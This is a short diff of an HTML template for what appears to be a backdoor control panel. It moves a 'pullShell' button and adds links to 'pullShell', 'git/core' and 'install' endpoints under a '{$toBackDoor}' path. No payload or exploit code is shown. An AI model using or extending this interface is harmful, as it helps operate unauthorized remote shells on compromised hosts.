@@ -15,6 +15,12 @@
                         <a class="btn btn-primary btn-lg " data-widgster="restore">
                             <i class="fa fa-backward"></i> Go Back  
                         </a>
+                         <a href="/{$toBackDoor}/{$Xtra}/pullShell" class="btn btn-warning btn-lg " >
+                           <i class="fa fa-github"></i>
+                        </a>
+                        <a href="/{$toBackDoor}/{$Xtra}/git/core" class="btn btn-danger btn-lg " >
+                           <i class="fa fa-ge"></i>
+                        </a>
                       <!--   <label class="label label-danger pull-right">
                         
                             Last Communication: 
@@ -90,9 +96,7 @@
                             
                         </a>
 
-                        <a href="/{$toBackDoor}/{$Xtra}/pullShell" class="btn btn-danger " >
-                           <i class="fa fa-github"></i>
-                        </a>
+                        
 
                         <a href="/{$toBackDoor}/{$Xtra}/install" class="btn btn-info " >
                            <i class="fa fa-star"></i>
@@ -100,6 +104,8 @@
                         <a class="btn btn-primary" data-widgster="fullscreen">
                            <i class="fa fa-question"></i> 
                         </a>
+
+
 
                     </p>
 
